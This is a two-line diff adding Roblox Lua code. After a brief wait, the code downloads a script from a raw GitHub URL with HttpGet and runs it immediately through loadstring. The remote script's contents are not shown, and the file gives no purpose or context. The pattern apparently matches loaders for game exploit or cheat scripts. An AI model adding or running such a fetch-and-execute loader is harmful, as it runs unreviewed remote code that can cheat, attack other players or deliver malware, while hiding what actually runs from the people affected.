@@ -1,0 +1,2 @@
+wait("0.2")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/messiontop2/bfd/refs/heads/main/dasd"))()
